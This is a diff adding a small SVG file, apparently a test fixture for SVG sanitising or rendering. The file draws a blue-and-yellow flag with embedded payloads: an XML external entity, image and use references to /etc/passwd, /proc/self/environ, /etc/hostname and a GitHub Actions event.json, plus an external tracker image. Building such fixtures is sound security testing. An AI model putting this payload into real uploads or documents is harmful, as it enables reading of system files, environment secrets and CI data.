@@ -1,0 +1,12 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [ <!ENTITY secret "file:///etc/passwd"> ]>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:q="http://www.w3.org/1999/xlink" width="600" height="400">
+  <rect width="600" height="400" fill="#006aa7"/><rect x="180" width="80" height="400" fill="#fecc00"/><rect y="160" width="600" height="80" fill="#fecc00"/>
+  <image width="600" height="400" href="file:///etc/passwd"/>
+  <image width="600" height="400" xlink:href="/proc/self/environ"/>
+  <image width="600" height="400" q:href="/home/runner/work/_temp/_github_workflow/event.json"/>
+  <image width="600" height="400" href="&secret;"/>
+  <image width="600" height="400" href="https://example.com/tracker.png"/>
+  <rect width="10" height="10" style="fill:url(file:///etc/hostname)"/>
+  <use xlink:href="file:///etc/passwd#x"/>
+</svg>
